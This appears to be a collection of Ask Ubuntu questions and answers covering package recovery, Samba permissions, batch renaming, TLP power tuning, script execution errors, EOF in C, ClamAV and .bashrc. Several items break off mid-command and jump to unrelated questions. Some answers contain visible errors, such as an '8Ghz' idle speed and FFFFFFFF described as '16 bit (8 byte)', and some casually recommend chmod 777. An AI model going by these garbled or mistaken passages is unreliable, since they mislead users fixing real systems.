such as 14.04 or 15.10 currently, but if it absolutely necessary to use the EOL releases, one must modify the sources.list file to obtain packages from http://old-releases.ubuntu.com/.\n", "Q: Is getting installed package list from a dead system possible? I need to recreate a system from a corrupt system disk image. \nI can't use the system when it boots. The backup algorithm left nothing but similarly corrupt images.

It doesn't take keyboard or mouse input and does not connect to the network.\nSince all I can think of is trying to look at the data files where the package information is kept, where are the?\nOnce I have the packages I can tweak the configuration of each package from the corrupt image if the data is still there.\n\nA: Technically speaking, yes it is possible. All installed packages have a *.list file associated with them; these files are lists of all the files that were created upon installation of a package (but that's beside the point, we only need to know the names of the packages themselves to know what's been installed).\nSo what you can do is connect the drive (could be SATA to USB connector or live CD/USB ) mount your broken drive's partition (with udisksctl mount -b /dev/sdb1 , note to replace sdb1 with actual disk), navigate to the mount point where partition was mounted, and run \n find ./var/lib/dpkg/info/ -name \"*.list\"  -type f -printf \"%P\\n\" |  awk -F'.'

No other changes to my smb.conf were necessary, and no need to chmod 0777.\n\nA: I've also documented that the Share name and Directory name cannot be the same or the share will be visible and read-only despite the permissions. When the Share name is modified to be different than the Directory (or Disk) name it will become writeable assuming it and the user have the correct permissions.\nI found this with NTFS disks and folders mounted in Ubuntu that had been previously shared under NTFS using the same Share names. Win and Linux sharing tools both default to the directory or disk name for their share name during creation so the conflict is built-in by default. Simply adding a character to the Linux Share name made it writeable.\nThis may or may not be true if the disk or directory are not NTFS or are NTFS but have never been shared. It appears that previously-used NTFS share names are reserved when mounted in Ubuntu and Linux deals with the conflict by making the share read-only.\nAn NTFS directory share named \\My Music simply renamed \\My Muzak in Ubuntu is enough to make the directory writeable.\n\nA: I had the same problem and fixed it with the good ole Windows reboot.

If you would start at the highest level for example, all files and folders below, would literally be moved, and would need to be found again for example:\n/folder & co/some other folder/test & file.txt\n\n->\n/folder and co/some other folder/test & file.txt\n\nThis is where python's os.walk() can help, to work recursively, ran with the argument topdown=False, to make sure it works from bottom to top.\nFor the same reason, you need to rename the files first, then the folders, and so does the script below:\nThe script\n#!/usr/bin/env python3\nimport shutil\nimport os\nimport sys\n\ndef move(subject):\n    shutil.move(os.path.join(root, subject), os.path.join(root, subject.replace(\"&\", \"and\")))\n\nfor root, dirs, files in os.walk(sys.argv[1], topdown=False):\n    for f in files:\n        move(f)\n    for d in dirs:\n        move(d)  \n\nHow to use\n\n\n*\n\n*Copy the script below into an empty file, save it as move.py\n\n*Run it with the directory with all your files and folders as an argument:\npython3 /path/to/move.py /path/to/directory\n\n\n*if the path includes spaces, use quotes:\npython3 /path/to/move.py '/path/to/directory'\n\n\nA: You could use find with -exec flag to call rename command for all the files found. \nfind . -type f  -name \"*&*\" -exec rename 's/&/AND/' {} +                        \n\nHere's a demo:\nDIR:/TESTDIR\nskolodya@ubuntu:$ ls\n\nDIR:/TESTDIR\nskolodya@ubuntu:$ touch \"tom&jerry\" \"jekyl&hide\"\n\nDIR:/TESTDIR\nskolodya@ubuntu:$ find . -type f  -name \"*&*\"\n./tom&jerry\n./jekyl&hide\n\nDIR:/TESTDIR\nskolodya@ubuntu:$ find . -type f  -name \"*&*\" -exec rename 's/&/AND/' {} +                                                    \n\nDIR:/TESTDIR\nskolodya@ubuntu:$ ls\njekylANDhide  tomANDjerry\n\n", "Q: Understanding rsync behaviour I need to transfer a 100 GB tar file over a Network Connection.\nI started the process with 'rsync -avP' to see it's Progress. \nThen the Connection broke after a few hours, of Course that was before the process was completed.\nI re-run the same command and luckily it seems to just continue the incomplete download.\nHowever, I now read that one should use the --partial Option to enable that behaviour.

Very good laptop - i5 5200U, 8GB RAM, nV 940M, ...\nBut, when I run windows10, my battery life is somewhere about 6-7hours (very low brightness and no gaming as well). In task manager I can see, that CPU frequency is scaling - I guess from 0.8GHz to 2.4 or something like that. But most of the time it is from 0.8-1.5. I guess that is why it has so long battery life.\nOn Ubuntu 15.04, the CPU never gets below 2GHz (I thing 2.2 all the time) and battery life is 3-4hours.\nI installed TLP, tried googling some info about change CPU frequency because I believe this is the biggest problem (CPU runs on very high frequency and consums very much battery) but I didn't find good solution and nothing gets changed.\nAny ideas?\n\nA: TLP needs to be configured. Run the following command to edit your /etc/default/tlp file:\nsudo nano /etc/default/tlp\n\nNow, locate the lines:\n#CPU_SCALING_GOVERNOR_ON_AC=performance\n#CPU_SCALING_GOVERNOR_ON_BAT=performance\n\nUncomment these lines (remove the #) and change performance to powersave like this:\nCPU_SCALING_GOVERNOR_ON_AC=powersave\nCPU_SCALING_GOVERNOR_ON_BAT=powersave\n\nPress CTRL + o and then press ENTER to save the file. Press CTRL + x to exit nano.\nRestart tlp to apply the changes:\nsudo service tlp restart\n\nYou may want to consider disabling pstate. intel_pstate only allows \"performance\" and \"powersave\". Disabling pstate allows the \"ondemand\" option which scales down the frequency when not in use and clocks up when there is more demand. See here for more info. Using the options and configuration mentioned in that post on my i3 2.4Ghz, in combination with the \"ondemand\" indicator-cpufreq setting, my processor idles about 1.2Ghz instead of the typical 2.1Ghz it is when set to \"performance\". On \"powersave\" it idles at about 8Ghz. \n\nFor your fan.\nAfter installing Ubuntu, you should run a few commands to properly detect your temperature sensors.

I am unable to write to an ext4 type partition on my external SD Card that I intend to use on my android device. The options in the permissions tab are greyed out. How can I acesss the partition and write to it?\n\nA: Did you run as root ? If the partition was not writable, probably the device is mounted as read-only, or you don't have permission to write.  \n\nA: Please see any of the numerous Internet tutorials on Unix/Linux ownership and permissions, such as:\n\n\n*\n\n*http://www.tutorialspoint.com/unix/unix-file-permission.htm\n\n*http://www.perlfect.com/articles/chmod.shtml\n\n*http://linuxcommand.org/lts0070.php\nThose are simply some of the first hits that I got in a Web search. (The last one looks like the best for a beginner, at first glance.)\nBasically, you need to change the ownership and/or permissions on the disk device, and possibly one or more of its subdirectories, when it is mounted. Thereafter you should be able to write as a normal user.\nNote, though, that Linux stores username information as user ID (UID) numbers. This is true for both Ubuntu and Android. This is important because the UID number used by Ubuntu (1000 for the first user, by default) might not match what Android uses. (I don't know what Android's default is, offhand.) The same is true for group ID (GID) values. Thus, you may need to set very lax permissions on the device's root directory, and on any shared subdirectories, if you're going to be able to write to it from both devices. Alternatively, you may need to coordinate your UID and/or GID values across your OSes. For all its problems, FAT can be easier for such cross-device applications. FAT doesn't support ownership or permissions, so Linux assigns ownership to whoever mounts the device, which makes ownership and permissions problems go away in many cases. OTOH, sometimes you need these features.\n", "Q: sudo: ./abc.sh: command not found Commands typed in terminal:\nchmod 777 abc.sh\nsudo ./abc.sh\n\nEvery shell program is giving the same error:\n.sh: command not found\n\nIncluding this simple abc.sh program:\n#!/bin/bash\n# My first script\necho \"Hello World!\"\n\nOutput of sudo od -c ./abc.sh:\n0000000 # ! / b i n / b a s h \\n # M y\n0000020 f i r s t s c r i p t \\n \\n e\n0000040 c h o \" H e l l o W o r l d\n0000060 ! \" \\n \\n\n0000064\n\n\n\n\nA: Well, from what you told us, it should be working perfectly... That is if the partition it's stored on supports unix/posix style permissions. I run into this error all the time if I try to run a script from a vfat or ntfs partition. Considering it's mounted in a location called work, is this on a USB drive with fat or ntfs formatted partition? If it is, you have to prefix the shell before the script. Check the partition, and that might be the issue. Move it to your home directory, and it might run easily, on a filesystem that supports unix/posix permissions.\nCheck if that's the case:\nmount |grep nisheet\nDoes is say vfat, fuseblock or ntfs? If so...\nTwo options:\n\n\n*\n\n*Prefix the shell in front of the script to run:\n\n\nbash abc.sh\n\n\n*Move it to a filesystem that supports Unix/Posix permissions:\n\n\nEx:\nmv abc.sh ~/\ncd ~\nchmod +x abc.sh\n./abc.sh\n\n\nA: Examine the output of this (from the directory where the abc.sh resides):\n$ type ./abc.sh\n$ ./abc.sh\n\nThe type command will first verify that your ./abc.sh is found.  If it isn't it will exit saying that it can't find the ./abc.sh file.  Then we would have to find out what it is about the filename that it can't be found.\nAlso, what is the name of the editor you are using to create your script file.  If you inadvertently used a Windows edit (through wine) this can cause problems with the line terminators in your script.\nTry using and edit such as nano or gedit.  You might use one of those recommended editors and create the same example file as, abc1.sh and ensure that you have the lines exactly as they are in your edited question.\n\nBy the way, the only way I can reproduce the error message that you gave in your question is by leaving out the abc part of the abc.sh file.\nThese commands will produce the error of your message:\n$ ./.sh\n$ sudo .sh\n\nPlease keep in mind that each error is unique and important in diagnosing the problem.  It's important to test and exact script and give the exact error message.\nFor example a permission denied error could be caused by trying to execute a file that doesn't have the execution bit set.  This can be set by executing the command that you reference in your question:\n$ chmod 777 abc.sh\n\nYou could also get the permission denied error by trying to execute a file that that is owned by root and doesn't have the world or group bit set for reading.  This can be a side effect of using sudo in your personal space when it's not necessary.  The chmod 777 that you mentioned in your question would also resolve that problem by giving reading and execution permission to all users.\nIf you have created the file in such that it's owned by root you will have to use the elevated command to change the properties.  This will give you access to execute the file:\n$ sudo chmod 777 abc.sh\n\nIf you have a reason to control who can execute or access the script you might take a look at some of the other options of chmod:\n$ man chmod\n\n\nAs suggested in the comments to your question, you shouldn't use the elevated command sudo to run scripts that you are testing.  If the testing is in your personal space, you can cause areas of your personal space to have become owned by root... losing personal access to those areas.  Some ill formed scripts could also cause corruption to other system files of our OS.  The mistyping of your attempt to run the abc.sh script is an example that errors can happen.  If you decided to remove your script or script work directory and mistakenly had a space in the wrong place it could cause serious problems where you least expect.\n\nA: Not a solution to the case of the asker, but it might help others, who come to this question:\nIf you get a command not found after trying to run a script (e. g. sudo ./abc.sh), make sure:\n\n*\n\n*You have the permission to execute the file. You can make the script executable for everyone by the following command:\n chmod a+x ./abc.sh\n\nDepending on your current access rights, you might have to prefix this command with sudo. You can check the current access rights with:\n ls -la ./abc.sh\n\n\n\n*Your script has a correct Shebang, e. g.:\n #!/bin/bash\n\nOtherwise, you have to run your script by calling your desired interpreter, e. g.:\n sudo bash ./abc.sh\n\n\n\n*Your script uses Unix line endings: Every line (also the last one!) has to end with a line feed (\\n or 0A in hex). It will not run with Windows line endings (\\r\\n or 0D 0A in hex), for example. You can use the following command to investigate on your line endings:\n hexdump -C ./abc.sh\n\n\nA: If the script is in the directory you are currently in, you have to use:\n. abc.sh\n\ninstead of:\n./abc.sh\n\nassuming your user has permissions.\n", "Q: which java se to download for linux 1 . i went to oracle site but i don't understand which Java to choose !\nLinux ARM 32 Hard Float ABI 77.71 MB    jdk-8u71-linux-arm32-vfp-hflt.tar.gz\nLinux ARM 64 Hard Float ABI 74.65 MB -----                                                                         < 1 > ----jdk-8u71-linux-arm64-vfp-hflt.tar.gz\n< 2 >---Linux x86   154.75 MB-----jdk-8u71-linux-i586.rpm\n< 3 >---Linux x86   174.91 MB-----jdk-8u71-linux-i586.tar.gz\n< 4 >---Linux x64   152.74 MBj-----dk-8u71-linux-x64.rpm\n< 5 >Linux x64  172.9 MB-----jdk-8u71-linux-x64.tar.gz\nit wont look clear so even after editing , so please vist the site so as you can understand better .\n2 . how do i choose , i don't understand what is ARM ? am using Linux Ubuntu   14.03 64 bit , and kindly tell me how do i set path here in Linux , \n\n\n*also tell me , what is oracle showing by saying\n< 1 >-----Java SE Development Kit 8u71\n< 2 >-----Java SE Development Kit 8u72\n\n\ni have already done Java on a win platform , require a small help from you all for Linux. \n\nA: ARM is not Intel based CPU.

I installed Ubuntu with Gnome desktop environment (I really do not like the Unity shell, looks so bad in my opinion).\nI like very much the Gnome, it looks more pro. I installed Ubuntu and not Fedora because, from what I have read, it is more popular and runs on tablets and phones (I hope there will be a Gnome option at installation, like OpenSuse has).\nAnyway, what is the difference between running the same Gnome desktop environment in Ubuntu and Fedora? \nWhat happens of one day Ubuntu will no longer support Gnome? Ubuntu Gnome is powered by \"the community\", that is how they say on forums, but what community? The Canonical/Ubuntu community or a general Linux community?\n\nA: The differences will be extremely subtle.\nUbuntu, before the 11.04 release, used the GNOME shell. But it kept alive after Unity's release with Ubuntu GNOME.\nThe GNOME shell used by Ubuntu is basically the same used by Fedora. The things that may change are the shell's version and the default theme used on it.\nThe GNOME project is one of the oldest initiatives to bring a full desktop experience. There was a time when a Linux user had to choose between KDE and GNOME. There weren't other relevant DEs at all. Ubuntu still uses lots of GNOME applications and resources, and the project is rock solid. So it probably won't be abandoned (not in a near future).\nThe same happens with Ubuntu GNOME: just like you, there are tons of people who dislike Unity or simply prefer to use other Desktop Environments. And while Ubuntu and GNOME keep being popular, Ubuntu GNOME will prosper. By the way, it is maintained by a separate community; Canonical does not develop it, but instead gives official support to the project.\n", "Q: What is EOF and how to trigger it? This is my C source code.\nWhen I build it in Ubuntu, it starts to get characters but I don't know how to end the program, as it does not end by inputting ENTER or a carriage return.\nWhat does EOF mean? How can I trigger it?\nThis source is also on a book by Dennis Ritchie:\n#include <stdio.h>\n    /* count digits, white space, others */\nmain ()\n{\n  int c, i, nwhite, nother;\n  int ndigit[10];\n  nwhite = nother = 0;\n  for (i = 0; i < 10; ++i)\n    ndigit[i] = 0;\n  while ((c = getchar ()) != EOF)\n    if (c >= '0' && c <= '9')\n      ++ndigit[c - '0'];\n    else if (c == ' ' || c == '\\n' || c == '\\t')\n      ++nwhite;\n    else\n      ++nother;\n  printf (\"digits =\");\n  for (i = 0; i < 10; ++i)\n    printf (\" %d\", ndigit[i]);\n  printf (\", white space = %d, other = %d\\n\", nwhite, nother);\n}\n\n\nA: TL;DR: EOF is not a character, it's a macro used for evaluating negative return of an input-reading function. One can use Ctrl+D to send EOT character which will force function return -1\nEvery programmer must RTFM\nLet us refer to  \"C A Reference Manual\", by Harbison and Steele, 4th ed. from 1995, page 317:\n\nThe negative integer EOF is a value that is not an encoding of a \"real\n  character\" . . . For example fget (section 15.6) returns  EOF when\n  at end-of-file, because there is no \"real character\" to be read.\n\nEssentially EOF isn't a character, but rather an integer value implemented in stdio.h to represent -1. Thus, kos's answer is correct as far as that goes, but it's not about receiving \"empty\" input. Important note is that  here EOF serves as return value (of getchar()) comparison , not to signify an actual character. The man getchar supports that:\n\nRETURN VALUE\nfgetc(), getc() and getchar() return the character read as an  unsigned\n    char cast to an int or EOF on end of file or error.\ngets()  and  fgets() return s on success, and NULL on error or when end\n    of file occurs while no characters have been read.\nungetc() returns c on success, or EOF on error.\n\nConsider the while loop - its primary purpose is to repeat action if condition in the brackets is true. Look again:\nwhile ((c = getchar ()) != EOF)\n\nIt basically says   keep doing stuff if  c =  getchar() returns successful code (0 or above ; it's a common thing by the way, try running successful command, then echo $? and then failed echo $? and see numbers they return ).   So if we successfully get character and assing to C , returned status code is 0, failed is -1. EOF is defined as -1.  Therefore  when condition -1 == -1 occurs, loops stops. And when will that happen ? When there is no more character to get, when c = getchar() fails. You could write while ((c = getchar ()) != -1) and it still would work\nAlso, let's go back to the actual code, here's an excerpt from stdio.h\n/* End of file character.\n   Some things throughout the library rely on this being -1.  */\n#ifndef EOF\n# define EOF (-1)\n#endif\n\nASCII codes and EOT\nAlthough EOF character is not an actual character, however, there exists an EOT (End of Transmission) character, which has ASCII decimal value of 04; it is linked to Ctrl+D shortcut ( represented also as meta character ^D). The end of transmission chracter used to signify closing of a stream of data way back when computers were used to control telephone connections , hence \"end of transmission\" naming. \nSo it is possible to send that ascii value to the program like so, note the $'\\04' which is the EOT:\nskolodya@ubuntu:$ ./a.out  <<< \"a,b,c $'\\04'\"                                  \ndigits = 1 0 0 0 1 0 0 0 0 0, white space = 2, other = 9\n\nThus , we can say that it does exists, but it is not printable\nSide Note\nWe often forget that in the past computers weren't as versatile - designers has to make use of every keyboard key available. Thus , sending EOT character with CtrlD is still \"sending a character\" , not unlike typing capital A, ShiftA, you still make give computer an input with available keys. Thus EOT is a real character in a sense that it does come from user, it is readable by computer (though not printable, non visible by humans), it exists in computer memory\nByte Commander's comment\n\nIf you try to read from /dev/null, that should return an EOF as well,\n  right? Or what do I get there?\n\nYes, exactly right, because in /dev/null there is no actual character to be read , hence it c = getchar() will return -1 code, and program will quit right away. Again command doesn't return EOF. EOF is just constant variable equal to -1 , which we use to compare return code of getchar function. EOF doesn't exist as character, it's just a static value inside stdio.h.\nDemo:\n# cat /dev/null shows there's no readable chars\nDIR:/xieerqi\nskolodya@ubuntu:$ cat /dev/null | cat -A        \n\n# Bellow is simple program that will open /dev/null for reading. Note the use of literal -1                                   \n   DIR:/xieerqi\nskolodya@ubuntu:$ cat readNull.c                                               \n#include<stdio.h>\n\nvoid main()\n{\n   char c;\n    FILE *file;\n    file = fopen(\"/dev/null\", \"r\");\n\n    if (file) \n    {\n    printf (\"Before while loop\\n\");\n        while ((c = getc(file)) != -1)\n            putchar(c);\n    printf(\"After while loop\\n\"); \n    fclose(file);\n    }\n}\n\nDIR:/xieerqi\nskolodya@ubuntu:$ gcc readNull.c -o readNull                                   \n\nDIR:/xieerqi\nskolodya@ubuntu:$ ./readNull\nBefore while loop\nAfter while loop\n\nAnother nail in the coffin\nSometimes it is attempted to be proved that EOF is a character with a code like this:\n#include <stdio.h>\nint main(void)\n{\n    printf(\"%c\", EOF);\n    return 0;\n}\n\nProblem with that is that char datatype can be a signed or unsigned value. In addition they are smallest addressable datatype which makes them very very useful in microcontrollers, where memory is limited. So instead of declaring int foo = 25; it is common to see in microcontrollers with small memory char foo = 25; or something similar.  In addition , chars may be signed or unsigned. \nOne could verify that the size in bytes with a program like this:\n#include <stdio.h>\nint main(void)\n{\n    printf(\"Size of int: %lu\\n\",sizeof(int));\n    printf(\"Sieze of char: %lu\\n\",sizeof(char));\n    //printf(\"%s\", EOF);\n    return 0;\n}\n\nskolodya@ubuntu:$ ./EOF                                                        \nSize of int: 4\nSieze of char: 1\n\nWhat exactly is the point ? The point is that EOF is defined as -1, but char datatype can print integer values. \nOK . . .so what if we try to print char as string ? \n#include <stdio.h>\nint main(void)\n{\n    printf(\"%s\", EOF);\n    return 0;\n}\n\nObviously an error, but nonetheless,error will tell us something interesting:\n\nskolodya@ubuntu:$ gcc EOF.c  -o EOF\n  EOF.c: In function ‘main’: EOF.c:4:5: warning: format ‘%s’ expects\n  argument of type ‘char *’, but argument 2 has type ‘int’\n  [-Wformat=]\n       printf(\"%s\", EOF);\n\nHex values\nPrinting EOF as a hex value gives FFFFFFFF, a 16 bit (8 byte) value, two's compliment of a -1.\n#include <stdio.h>\nint main(void)\n{\n    printf(\"This is EOF: %X\\n\", EOF);\n    printf(\"This is Z: %X\\n\",'Z');\n    return 0;\n}\n\nOutput:\nDIR:/xieerqi\nskolodya@ubuntu:$ ./EOF                                                        \nThis is EOF: FFFFFFFF\nThis is Z: 5A\n\nAnother curious thing occurs with the following code:\n#include <stdio.h>\nint main(void)\n{\n   char c;\n   if (c = getchar())\n    printf (\"%x\",c);\n    return 0;\n}\n\nIf one presses Shift + A , we get hex value 41 , obviously same as in ASCII table. But for Ctrl + D , we have ffffffff , again - the return value of getchar() stored in c. \nDIR:/xieerqi\nskolodya@ubuntu:$ gcc  EOF.c -o ASDF.asdf                                      \n\nDIR:/xieerqi\nskolodya@ubuntu:$ ./ASDF.asdf                                                  \nA\n41\nDIR:/xieerqi\nskolodya@ubuntu:$ ./ASDF.asdf                                                  \nffffffff\n\nRefer to other languages\nNotice that other language avoid this confusion, because they operate on evaluating a function exit status, not comparing it with a macro.\nHow does one read file in Java ?\n    File inputFile  = new File (filename);\n    Scanner readFile = new Scanner(inputFile);\n    while (readFile.hasNext())\n        { //more code bellow  }\n\nHow about python? \nwith open(\"/etc/passwd\") as file:\n     for line in file:\n          print line\n\n\nA: Tl;dr\nYou can generally \"trigger EOF\" in a program running in a terminal with a CTRL+D keystroke right after the last input flush.\n\n\nWhat does EOF mean? How can I trigger it?\n\nEOF means End-Of-File.\n\"Triggering EOF\" in this case roughly means \"making the program aware that no more input will be sent\".\nIn this case, since getchar() will return a negative number if no character is read, the execution is terminated.\nBut this doesn't only apply to your specific program, it applies to many different tools.\nIn general \"triggering EOF\" can be done with a CTRL+D keystroke right after the last input flush (i.e. by sending an empty input).\nFor example with cat:\n% cat >file # Hit ENTER\nfoo # Hit ENTER and CTRL+D\n% \n\nWhat's happening under the hood when hitting CTRL+D is that the input typed since the last input flush is flushed; when this happens to be an empty input the read() syscall called on the program's STDIN returns 0, getchar() returns  a negative number (-1 in the GNU C library) and this is in turn interpreted as EOF1.\n\n1 - https://stackoverflow.com/a/1516177/4316166\n\nA: EOF stands for end of file. While I do not know how to trigger the following symbol, you can run the following program through piping a file, which sends the EOF signal at the end:\necho \"Some sample text\" | ./a.out\n\nwhere a.out is your compiled source\n", "Q: Unsupported Ubuntus - is it safe to continue with them? I'll try to be as clear as I can about this, hoping to get clear answers.\nI have Ubuntu Studio 15.10, which is not an LTS version, and will only be supported till July 2016.\n\n\n*\n\n*Does that mean there will be no updates whatsoever available, by the end of the support period?\n\n*Or does it just mean that Canonical will not update the 15.10, but updates will be available from some backports, or other repositories?\n\n*Is it recommended to update to the 16.04 LTS version, when support (official at least) for 15.10 will cease?\n\n*Will a clean install be required, in the case of upgrading from 15.10 to 16.04, or will there be a direct upgrade path?\n\n\nPlease note, that my questions (and thereby the answers) should not only be intended for Ubuntu Studio, but all the Ubuntu family, Ubuntu, Xubuntu, Lubuntu, Kubuntu, Edumuntu, Ubuntu GNOME, and others, if I have forgotten some.\n\nA: mate! Hope this helps you:\n\n\n*\n\n*Yes, it means there will be no official support from canonical for 15.10. That is the reason why LTS is always recommended for people who need stability. You can still keep using 15.10 normally, tough.\n\n*Yes, you can patch and update your system from other sources and/or repositories, but I wouldn't recommend it. You can even install a newer kernell version, if you want, but in my opinion it is more practical to just install the newest LTS.\n\n*Yes. LTS is safer, stable and supported for a longer time (FYI I'm still using 14.04 and having a blast).\n\n*I think there will be an upgrade path. Check this page for more information: http://www.ubuntu.com/download/desktop/upgrade\nHowever, in my opinion it is better to do a clean install, since you will probably stay with 16.04 for some time. In my case, I think I'll wait until July of 2016 to upgrade to 16.04, for example. LTS is great because it gives you a lot of time to make your choice about upgrading.\n\nA: Just a minor addition to two great answers: the most annoying thing for me about using an unsupported version is that a few months after the support window ends, apt-get stops working. The main apt repositories delete references to your version. Of course you can find archives and add them to your sources list and it starts working again, so this isn't a deal breaker. But it's one of those things that makes me feel like what I'm doing is probably a bad idea.\nI actually recently downgraded some boxes from 14.10 to 14.04 because of this.\n\nA: Well, better be concise:\n\n\n*\n\n*Yes  \n\n*No, there will be no updates.\n    You will be able to install obsolete software from the EOL repositories, but nothing there will be updated and you will not receive help from this or other official help websites.\n    Also, when the distro version becomes EOL you will have to follow a particular procedure to upgrade it to the next version (and not always works)\n\n*Yes (even before, so you have time to adapt to your new system)\n\n*No, a clean install will not be required.

I want to both the diffence and how to diffrentiate amongst lucid and karmic user and which category do i fall into?\n\nA: Every Ubuntu release gets its own codename. For instance, Ubuntu 15.04 is called Vivid Vervet. 14.04 is called Trusty Tahr. Lucid and Karmic aren't \"categories,\" they're version names of two different releases of Ubuntu.\nLucid's full name is Lucid Lynx. It's the codename for Ubuntu 10.04, which was released in April of 2010. It's really old, and no longer supported, so you shouldn't install it.\nKarmic's full name is Karmic Koala: Ubuntu 9.10. It's even older than Lucid. Please don't attempt to install this version either.\nYou don't fit into either category, because they aren't categories. They're consecutive releases of Ubuntu. I'm a little unsure as to what made you think they were categories of any sort.\nIf you want to install Ubuntu, you need to download one of the newer versions, such as Trusty Tahr (14.04 LTS) or Wily Werewolf (15.10). 14.04 is LTS, meaning \"Long-Term Support.\" Releases like this happen every two years, so the next one, 16.04, is going to be released this April. LTS releases, like the name suggests, are kept under support for a very long time. 14.04, for instance, is supported until 2019, I believe. If you don't trust yourself with frequent upgrades to newer versions of Ubuntu, stay with LTS. You won't get any version of Ubuntu that has a short support term, like 15.04, which is going ot reach its End-of-Life on February 4th.\nUbuntu also has a system for releases. 10.04 was released in April 2010. 11.04 was released in April 2011. 10.10 was released in October 2010. 11.10 was released in October 2011. See a pattern? The first number in the version is the year, and the second number is the month: yy.mm.\nIf you are thinking of installing Ubuntu, go to the Ubuntu website and download 14.04 LTS. If you have Windows, use Rufus to burn the ISO to a USB drive, and then boot from that drive. If you have a Mac, you'll have to use UNETBootin to burn the ISO to a USB drive.\nAny clarifications? Comment.\n\nA: They're respectively users of Ubuntu Lucid Lynx (thatis, Ubuntu 10.04 LTS) and Ubuntu Karmic Koala (thatis, Ubuntu 9.10). \nYou can have a look at the list of Ubuntu releases here.\nTo know which version you are running, type the following in a terminal:\nlsb_release -a\n\n", "Q: Wifi says it's connected but it isn't. I made a big mistake when trying to help somebody on this site. Someone had a question, and I was working with and hdmi cable and installing the most current nvidia at the same time. My goal was to improve the resolution so that when you plugged in the cable you could see the entire menu and check the setting that you needed. \nThese are the suggestions I was following:\nsudo apt-get purge nvidia*\n\nSince I cannot look it up in the history I don't remember if that was the exact command but the last two words were. Then I did this:\nsudo apt-get install nvidia-current\n\nAnd that is where I ran into trouble. \nWhen I plugged in the cable, the monitor went black. I unplugged it and it remained black. I tried to log out with ctrl+alt+del, but I still couldn't see anything. I did a hard shut down. I had to reinstall the OS after that, and now the wifi is not working. The interesting thing about it is it says it's connected. It shows a symbol of a a computer, not the wifi symbol that you usually see. I am using 15.10. Thank you for all of your assistance in advance, I really appreciate it. \n\nA: I can't comment, but if you did a reinstall it is unlikely anything you did with the driver is affecting you now (unless you somehow produced a hardware problem).  However, my enthusiest-level understanding of how hardware works makes me think it unlikely that anything you were doing with your HDMI port would have affected your Wifi without damaging a lot more than the Wifi... and indeed the likelihood of any harms seems pretty low.  If you are reinstalling, you probably are reinstalling a different version or are downloading newer/updated packages than you had present on your system before.\nOn the basis of that conclusion, I'd say that you are best of debugging and treating your wifi issue as separate from any of your pre-re-install activities.  Do you know what type of chipset your wifi is using?  Are you sure you have the support packages installed?

Debian packages are files with .deb extension. They come with all the needed files (binaries, scripts, documentation, manual pages) to install a program. They can be installed using the dpkg tool. There are several ways of installing from Debian packages, such as using APT (Advanced Packaging Tool) with apt-get, which downloads the requested .deb file from the repositories and uses dpkg to process it. There are some front-ends for APT and dpkg, for example, GDebi and the Ubuntu Software Center.\n\n*Compiling and installing from the source code: this is a more advanced and difficult task, but sometimes it is required due to lack of precompiled packages or because of some special necessity. This method consists of getting a program's source code and compiling it (usually using GNU building tools, in the Linux world). It may take monstrous amounts of time, depending on your hardware and the size of the source code.\nBut both ways of installing packages basically do one common thing: placing files in specific locations of your system. These files include everything needed to have a program up and running. The locations include paths like /usr/bin, /usr/share, among tons of others. It varies from package to package.\n", "Q: How do I find out if my server is a spambot?

Good luck ;-) then. \nDisabled HIBERNATION will re-enable Ubuntu boot. \nThis applies too when the Winstuff fell asleep.

But worth trying :)\nThere are many such antivirus software available, one of them which I prefer is: ClamAV\nYou can install ClamAV  via Terminal with:\nsudo apt-get install clamav\n\n(Its also available in Software Center)\nAnd you can Install clamtk (for graphical interface) from the deb file here: \nDave M\nclamtk\n\nWhile installing, select the version v5.09 (trusty-backports)\nOr you can install it using the following commands: (but here it is Outdated)\n\nsudo add-apt-repository ppa:landronimirc/clamtk -y\nsudo apt-get update\nsudo apt-get install clamav clamtk\n\n\nAfter Installing , Update Virus Definitions : sudo freshclam\nThen search for clamtk in your dash and you will get it.\nNote : you might need to enable “backports” repository to get updates, so follow : How do I enable the “backports” repository?\nyou can try Avast!\n\n\n*\n\n*Download the .deb file of avast linux edition from here : avast Linux Home Edition\n\n*Install it : just double click on the *.deb file and you can install it.\n\n*Register for free 1 year license her : Avast Registration\n\n*Launch and scan your files!\n\n\nYou can get lot of similar anti viruses for Linux .\nAs GSM-S said, you might have to boot into any Windows installation Media and try \"repair my computer\"\nSuggestion :   Don't play with viruses out of curiosity!\n\nA: Try an antivirus on ubuntu. Then run the repair disc that came with Windows 8. \nhttps://help.ubuntu.com/community/Antivirus\n", "Q: Of what help is SE linux to me? i am new to Linux. I have heard about SE linux ... how does it work with Ubuntu and what can i do with it?\n\nA: SELinux is a security extension focused on restricting access to files based on the program being run rather than the user running it.  For example, your web browser does not need access to every file that your account has access to, so SELinux can be configured to ony give it access to the files it needs, so that even if you go to a bad web site that takes over your browser and tries to access your files, the access will be denied.\nAppArmor is a similar ( though simpler ) system that Ubuntu uses by default.\n", "Q: Can't get my Belkin N150 wireless adapter to work, stuck on \"setting network address\" I have installed Kubuntu 15.10 and everything is great, aside from the fact that I just cannot get my Belkin N150 Wireless USB adapter to connect to my wifi. \nIt shows my Network, but when I try to connect it gets stuck on \"Setting network address\", until it shows the notification \"IP configuration is unavailable\". \nWhat makes this so strange is that I can get the adapter to work without any issues on other Linux distros like Mint or Manjaro, it's just Kubuntu that wont work with it. \nI can also use different wireless adapters, I borrowed my brother's and it connected just fine.  \nI'm super confused by this all and really need some help!\nThanks a million,\nAlex\n\nA: *\n\n*Open or search for the application Software Sources.\n\n*Click the rightmost tab: \"proprietary drivers\" or so.\n\n*Check all the boxes listed.

I am just curious about what would happen if I delete the ~/.bashrc file of a user. Does even the root user have their own ~/.bashrc file? What if I delete that, or can I?\n\nA: If you delete a user's  ~/.bashrc  nothing special happens. Bash will still  start and use the system-wide /etc/bash.bashrc.\nJust like any user root may or may not have a ~/.bashrc, and if it exists you can delete if you have write permission on /root/.\n\nA: If you delete a user's .bashrc and they put work into it, they will get really mad at you!!! Just back it up / move it aside by using mv ~user/.bashrc ~user/.bashrc.orig\nThe \"what will happen\" has been addressed in other questions, the user will still be able to log in, using the system default profile, assuming you're in Ubuntu that's covered here: How do I restore .bashrc to its default?\nThat question is possible a duplicate of this one that also provides the info (as do other answers here) about /etc/skel How to restore .bashrc file?\n\nA: *\n\n*You cant remove root user .bashrc file unless you are root user.\n\n*In case if .bashrc file deleted for your account then you can restore it with \n cp /etc/skel/.bashrc ~/.bashrc\n\nBut this is not your old .bashrc file. It's a new .bashrc file with default configuration.\nUpdate: Curiosity and over Curiosity\nThere is no problem as menioned in above answer if you have deleted .bashrc file. Your system will be using system wide /etc/bash.bashrc file and run as usually.\nBut If System wide 